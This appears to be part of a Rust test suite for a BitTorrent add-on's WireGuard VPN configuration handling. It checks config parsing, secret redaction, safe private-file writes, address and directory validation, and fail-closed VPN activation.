            "[Interface]\n# Key for x\nPrivateKey = {PRIV}\nAddress = 10.2.0.2/32\n\
             # DNS = 9.9.9.9\nDNS = 10.2.0.1\n# [Peer]\n# MTU = 1280\n\
             [Peer]\n# NL-FREE#1\nPublicKey = {PUB}\nEndpoint = 190.2.131.156:51820\n"
        );
        for flat in [
            conf.clone(),
            conf.replace('\n', " "),
            conf.replace('\n', ""),
        ] {
            let c = parse_wg_conf(&flat).unwrap_or_else(|e| panic!("{e:#}\n{flat}"));
            assert_eq!(c.dns, vec!["10.2.0.1"], "{flat}");
            assert_eq!(c.mtu, None, "{flat}");
            assert_eq!(c.addresses, vec!["10.2.0.2/32"], "{flat}");
            assert_eq!(c.peer_public_key.as_deref(), Some(PUB), "{flat}");
        }
    }

    #[test]
    fn a_truncated_key_does_not_swallow_the_next_entry() {
        let short = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYU=";
        let conf = PROTON_CONF.replace(PRIV, short).replace("\r\n", "");
        let c = parse_wg_conf(&conf).unwrap();
        assert_eq!(c.private_key.as_deref(), Some(short));
        assert_eq!(c.addresses, vec!["10.2.0.2/32", "2a07:b944::2:2/128"]);
        assert!(settings(&opts_with_conf(&conf)).is_err());
    }

    #[test]
    fn errors_warnings_and_debug_never_show_secrets() {
        // A bare private key without its `=` padding: no `Key =` at all.
        let bare = format!("[Interface]\n{}\n", &PRIV[..43]);
        let err = format!("{:#}", parse_wg_conf(&bare).unwrap_err());
        assert!(!err.contains(&PRIV[..20]), "{err}");
        assert!(err.contains("line 2"), "{err}");
        // `<43 chars>=` splits into an unknown "key" of key material.
        let warned = parse_wg_conf(&format!("[Interface]\nPrivateKey = {PRIV}\n{PRIV}\n")).unwrap();
        assert!(
            warned.warnings.iter().all(|w| !w.contains(&PRIV[..20])),
            "{:?}",
            warned.warnings
        );
        let opts = Options {
            wireguard_conf: Some(PROTON_CONF.to_owned()),
            wg_private_key: Some(PRIV.to_owned()),
            wg_preshared_key: Some(PSK.to_owned()),
            webui_password: Some("hunter2-hunter2".to_owned()),
            ..Options::default()
        };
        let dbg = format!("{opts:?} {:?}", parse_wg_conf(PROTON_CONF).unwrap());
        for secret in [&PRIV[..20], &PSK[..20], "hunter2"] {
            assert!(!dbg.contains(secret), "{secret} in {dbg}");
        }
        assert!(dbg.contains("<redacted>"));
    }

    #[test]
    fn write_private_never_reuses_or_follows_a_planted_file() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("rbt-wp-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let target = dir.join("wg0.conf");
        // The old predictable temp names, planted world-readable / as a symlink.
        let planted = dir.join("wg0.tmp");
        std::fs::write(&planted, "old").unwrap();
        std::fs::set_permissions(&planted, std::fs::Permissions::from_mode(0o644)).unwrap();
        let elsewhere = dir.join("elsewhere");
        std::os::unix::fs::symlink(&elsewhere, dir.join(".wg0.conf.tmp")).unwrap();
        write_private(&target, "secret\n").unwrap();
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "secret\n");
        let mode = std::fs::metadata(&target).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600);
        assert_eq!(std::fs::read_to_string(&planted).unwrap(), "old");
        assert!(!elsewhere.exists());
        // No temp files left behind.
        let leftovers: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(Result::ok)
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.ends_with(".tmp") && n.starts_with(".wg0.conf.") && n != ".wg0.conf.tmp")
            .collect();
        assert!(leftovers.is_empty(), "{leftovers:?}");
        // A failing rename (target is a directory) cleans up its temp file.
        let blocked = dir.join("blocked");
        std::fs::create_dir_all(blocked.join("x")).unwrap();
        assert!(write_private(&blocked, "x").is_err());
        let after: Vec<_> = std::fs::read_dir(&dir)
            .unwrap()
            .filter_map(Result::ok)
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.starts_with(".blocked."))
            .collect();
        assert!(after.is_empty(), "{after:?}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn unusable_addresses_are_rejected() {
        for bad in [
            "127.0.0.1:51820",
            "224.0.0.1:51820",
            "0.0.0.0:51820",
            "255.255.255.255",
        ] {
            assert!(parse_endpoint(bad).is_err(), "{bad}");
        }
        // `Address` with a port is a typo, not an IPv6 address to skip.
        let typo = PROTON_CONF.replace("10.2.0.2/32, ", "10.2.0.2:51820, ");
        assert!(settings(&opts_with_conf(&typo)).is_err());
        // Loopback / 0.0.0.0 DNS entries are dropped (Proton's DNS is used instead).
        let dns = PROTON_CONF.replace("DNS = 10.2.0.1, 2a07:b944::2:1", "DNS = 127.0.0.1, 0.0.0.0");
        let s = settings(&opts_with_conf(&dns)).unwrap();
        assert_eq!(vpn(&s).wireguard.dns, vec![PROTON_GATEWAY]);
        let mut o = opts_with_conf(PROTON_CONF);
        o.nat_pmp_gateway = "127.0.0.1".into();
        assert!(settings(&o).is_err());
    }

    #[test]
    fn generated_password_is_created_once_and_private() {
        use std::os::unix::fs::PermissionsExt;
        let root = temp_dir("pw");
        let paths = Paths {
            config_root: root.clone(),
        };
        let s = Settings::from_options(&opts_with_conf(PROTON_CONF), &paths).unwrap();
        let (first, generated) = s.resolve_webui_password().unwrap();
        assert!(generated);
        assert_eq!(first.expose().len(), 24);
        assert!(first.expose().chars().all(|c| c.is_ascii_alphanumeric()));
        let file = root.join(GENERATED_PASSWORD_FILE);
        let mode = std::fs::metadata(&file).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600);
        let (again, generated) = s.resolve_webui_password().unwrap();
        assert!(!generated);
        assert_eq!(again, first, "the generated password is stable");

        let mut o = opts_with_conf(PROTON_CONF);
        o.webui_password = Some("my-own-password".into());
        let s = Settings::from_options(&o, &paths).unwrap();
        assert_eq!(
            s.resolve_webui_password().unwrap().0.expose(),
            "my-own-password"
        );
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn webui_credentials_are_validated() {
        let mut o = opts_with_conf(PROTON_CONF);
        let s = settings(&o).unwrap();
        assert_eq!(s.webui_username, "admin");
        assert!(s.webui_password.is_none());
        assert!(s.enable_dht);
        assert_eq!(s.ingress_port, 8099);

        o.webui_password = Some("hunter2-but-longer".into());
        let s = settings(&o).unwrap();
        assert_eq!(
            s.webui_password.as_ref().map(Secret::expose),
            Some("hunter2-but-longer")
        );
        assert_eq!(
            format!("{:?}", s.webui_password),
            "Some(Secret(<redacted>))"
        );

        for bad in ["short", "has\nnewline-inside"] {
            o.webui_password = Some(bad.into());
            assert!(settings(&o).is_err(), "{bad:?}");
        }
        o.webui_password = Some(String::new());
        assert!(
            settings(&o).unwrap().webui_password.is_none(),
            "empty means generate"
        );
        for bad in ["", "a b", "a:b", "x\u{7}"] {
            o.webui_username = bad.into();
            assert!(settings(&o).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn missing_or_invalid_credentials_fail_with_guidance() {
        let on = Options {
            vpn_enabled: true,
            ..Options::default()
        };
        let err = format!("{:#}", settings(&on).unwrap_err());
        assert!(
            err.contains("VPN mode is on (`vpn_enabled` is on)"),
            "{err}"
        );
        assert!(err.contains("wg0.conf"), "{err}");
        assert!(err.contains("wireguard_conf"), "{err}");
        assert!(err.contains("wg_private_key"), "{err}");

        let mut o = structured_options();
        o.wg_private_key = Some("not-a-key".into());
        let err = format!("{:#}", settings(&o).unwrap_err());
        assert!(err.contains("not a valid WireGuard key"), "{err}");
        assert!(!err.contains(PRIV), "error must never echo key material");

        let mut same = structured_options();
        same.wg_public_key = Some(PRIV.into());
        assert!(settings(&same).is_err());

        let mut v6only = structured_options();
        v6only.wg_address = Some("2a07:b944::2:2/128".into());
        assert!(settings(&v6only).is_err());

        // A conf missing a value names the source and the fallback field.
        let no_endpoint = PROTON_CONF.replace("Endpoint = 190.2.131.156:51820\r\n", "");
        let err = format!("{:#}", settings(&opts_with_conf(&no_endpoint)).unwrap_err());
        assert!(
            err.contains("wireguard_conf") && err.contains("wg_endpoint"),
            "{err}"
        );
    }

    #[test]
    fn options_json_deserialises_with_defaults() {
        let json = r#"{
            "wireguard_conf": "",
            "wg_private_key": "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=",
            "wg_public_key": "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=",
            "wg_endpoint": "190.2.131.156:51820",
            "wg_address": "10.2.0.2/32",
            "nat_pmp_gateway": "10.2.0.1",
            "enable_nat_pmp": false,
            "download_dir": "/share/rt/incomplete",
            "completed_dir": "/share/rt/done",
            "local_allow_cidrs": ["192.168.1.0/24", "10.0.0.0/8"],
            "log_level": "debug",
            "some_future_option": 1
        }"#;
        let o = Options::from_json(json).unwrap();
        assert_eq!(o.log_level, LogLevel::Debug);
        assert_eq!(o.listen_port, DEFAULT_LISTEN_PORT);
        let s = settings(&o).unwrap();
        assert!(vpn(&s).nat_pmp.is_none(), "static port mode");
        assert_eq!(s.static_bt_ports(), vec![DEFAULT_LISTEN_PORT]);
        assert_eq!(s.download_dir, PathBuf::from("/share/rt/incomplete"));
        assert_eq!(s.data_home, PathBuf::from("/config/db"));
        assert_eq!(s.cache_home, PathBuf::from("/config/cache"));
        let cidrs: Vec<String> = s
            .local_allow_cidrs
            .iter()
            .map(ToString::to_string)
            .collect();
        assert_eq!(
            cidrs,
            vec!["10.0.0.0/8", "172.30.32.0/23", "192.168.1.0/24"]
        );
        assert!(Options::from_json("{not json").is_err());
        assert!(Options::from_json(r#"{"log_level": "loud"}"#).is_err());
    }

    #[test]
    fn local_cidrs_are_restricted_to_private_ranges() {
        let mut o = opts_with_conf(PROTON_CONF);
        for bad in ["0.0.0.0/0", "8.8.8.0/24", "128.0.0.0/1", "garbage"] {
            o.local_allow_cidrs = vec![bad.into()];
            assert!(settings(&o).is_err(), "{bad} must be rejected");
        }
        o.local_allow_cidrs = vec!["192.168.1.9/24".into(), "100.64.0.0/10".into()];
        let s = settings(&o).unwrap();
        let cidrs: Vec<String> = s
            .local_allow_cidrs
            .iter()
            .map(ToString::to_string)
            .collect();
        assert_eq!(
            cidrs,
            vec!["100.64.0.0/10", "172.30.32.0/23", "192.168.1.0/24"]
        );
        assert!(s.notes.iter().any(|n| n.contains("normalised")));
    }

    #[test]
    fn data_dirs_must_be_on_mapped_storage() {
        let mut o = opts_with_conf(PROTON_CONF);
        for bad in [
            "relative/path",
            "/etc/x",
            "/media",
            "/media/../etc",
            "/data/x",
        ] {
            o.download_dir = bad.into();
            assert!(settings(&o).is_err(), "{bad} must be rejected");
        }
        o.download_dir = "/media/rbittorrent/completed".into();
        assert!(settings(&o).is_err(), "same dir for both");
        o.download_dir = "/share/incomplete".into();
        let s = settings(&o).unwrap();
        assert!(s.notes.iter().any(|n| n.contains("different mounts")));
    }

    #[test]
    fn proton_nat_pmp_off_is_flagged() {
        let conf = PROTON_CONF.replace("Port Forwarding) = on", "Port Forwarding) = off");
        let s = settings(&opts_with_conf(&conf)).unwrap();
        assert!(
            s.notes
                .iter()
                .any(|n| n.contains("NAT-PMP (Port Forwarding) = off"))
        );
        let mut o = opts_with_conf(&conf);
        o.nat_pmp_gateway = "not-an-ip".into();
        assert!(settings(&o).is_err());
    }

    #[test]
    fn keepalive_off_is_forced_on_and_mtu_validated() {
        let conf = format!("{PROTON_CONF}PersistentKeepalive = off\n");
        assert_eq!(
            vpn(&settings(&opts_with_conf(&conf)).unwrap())
                .wireguard
                .persistent_keepalive,
            DEFAULT_KEEPALIVE
        );
        let conf = PROTON_CONF.replace("DNS =", "MTU = 9000\r\nDNS =");
        assert!(settings(&opts_with_conf(&conf)).is_err());
    }

    #[test]
    fn vpn_is_off_on_a_fresh_install_and_needs_nothing() {
        let root = temp_dir("direct");
        let paths = Paths {
            config_root: root.clone(),
        };
        let s = Settings::from_options(&Options::default(), &paths).unwrap();
        assert!(
            s.vpn.is_none(),
            "zero-config first boot is a direct connection"
        );
        assert_eq!(s.fallback_listen_port, DEFAULT_LISTEN_PORT);
        assert!(s.static_bt_ports().is_empty(), "no firewall in direct mode");
        assert_eq!(vpn_intent(&Options::default(), false), None);

        // Blank fields (the add-on UI leaves empty strings) do not count.
        let blank = Options {
            wireguard_conf: Some("  \n".into()),
            wg_private_key: Some(String::new()),
            wg_dns: Some(" ".into()),
            ..Options::default()
        };
        assert_eq!(vpn_intent(&blank, false), None);
        assert!(
            Settings::from_options(&blank, &paths)
                .unwrap()
                .vpn
                .is_none()
        );
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn any_wireguard_input_auto_promotes_vpn_mode() {
        let one = |f: fn(&mut Options)| {
            let mut o = Options::default();
            f(&mut o);
            vpn_intent(&o, false)
        };
        let expect = |field: &str| Some(format!("auto-enabled: `{field}` is filled in"));
        assert_eq!(
            one(|o| o.wireguard_conf = Some("x".into())),
            expect("wireguard_conf")
        );
        assert_eq!(
            one(|o| o.wg_private_key = Some("x".into())),
            expect("wg_private_key")
        );
        assert_eq!(
            one(|o| o.wg_public_key = Some("x".into())),
            expect("wg_public_key")
        );
        assert_eq!(
            one(|o| o.wg_preshared_key = Some("x".into())),
            expect("wg_preshared_key")
        );
        assert_eq!(
            one(|o| o.wg_endpoint = Some("x".into())),
            expect("wg_endpoint")
        );
        assert_eq!(
            one(|o| o.wg_address = Some("x".into())),
            expect("wg_address")
        );
        assert_eq!(one(|o| o.wg_dns = Some("x".into())), expect("wg_dns"));
        assert_eq!(
            vpn_intent(&Options::default(), true),
            Some("auto-enabled: /config/wg0.conf exists".to_owned())
        );

        // A complete configuration with vpn_enabled left off: VPN mode.
        let s = settings(&structured_options()).unwrap();
        assert_eq!(
            vpn(&s).reason,
            "auto-enabled: `wg_private_key` is filled in"
        );
        let s = settings(&opts_with_conf(PROTON_CONF)).unwrap();
        assert_eq!(
            vpn(&s).reason,
            "auto-enabled: `wireguard_conf` is filled in"
        );
    }

    #[test]
    fn incomplete_wireguard_input_never_falls_back_to_direct() {
        // One stray field: VPN mode is on, so the gap is an error.
        let o = Options {
            wg_dns: Some("10.2.0.1".into()),
            ..Options::default()
        };
        let err = format!("{:#}", settings(&o).unwrap_err());
        assert!(
            err.contains("VPN mode is on (auto-enabled: `wg_dns` is filled in)"),
            "{err}"
        );

        let root = temp_dir("failclosed");
        let paths = Paths {
            config_root: root.clone(),
        };
        // An empty wg0.conf (e.g. a half-finished copy) still means VPN.
        std::fs::write(root.join(WG_CONF_FILE), "").unwrap();
        let err = format!(
            "{:#}",
            Settings::from_options(&Options::default(), &paths).unwrap_err()
        );
        assert!(
            err.contains("auto-enabled: /config/wg0.conf exists"),
            "{err}"
        );
        // So does an unreadable one (here: a directory).
        std::fs::remove_file(root.join(WG_CONF_FILE)).unwrap();
        std::fs::create_dir(root.join(WG_CONF_FILE)).unwrap();
        assert!(path_present(&root.join(WG_CONF_FILE)));
        assert!(Settings::from_options(&Options::default(), &paths).is_err());
        // A dangling symlink is present too.
        std::fs::remove_dir(root.join(WG_CONF_FILE)).unwrap();
        std::os::unix::fs::symlink(root.join("gone"), root.join(WG_CONF_FILE)).unwrap();
        assert!(path_present(&root.join(WG_CONF_FILE)));
        assert!(Settings::from_options(&Options::default(), &paths).is_err());
        assert!(!path_present(&root.join("nothing-here")));
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn static_port_mode_opens_listen_port_on_wg0() {
        // TorGuard / AirVPN / Windscribe: a fixed forwarded port, no NAT-PMP.
        let mut o = opts_with_conf(PROTON_CONF);
        o.enable_nat_pmp = false;
        o.listen_port = 51413;
        let s = settings(&o).unwrap();
        assert!(vpn(&s).nat_pmp.is_none());
        assert_eq!(s.fallback_listen_port, 51413);
        assert_eq!(s.static_bt_ports(), vec![51413]);

        // With NAT-PMP the leased port is opened later, never a static one.
        o.enable_nat_pmp = true;
        let s = settings(&o).unwrap();
        assert!(vpn(&s).nat_pmp.is_some());
        assert!(s.static_bt_ports().is_empty());

        // `vpn_enabled` alone with a full config behaves the same.
        o.vpn_enabled = true;
        o.enable_nat_pmp = false;
        let s = settings(&o).unwrap();
        assert_eq!(vpn(&s).reason, "`vpn_enabled` is on");
        assert_eq!(s.static_bt_ports(), vec![51413]);

        o.listen_port = 0;
        assert!(settings(&o).is_err());
    }
}
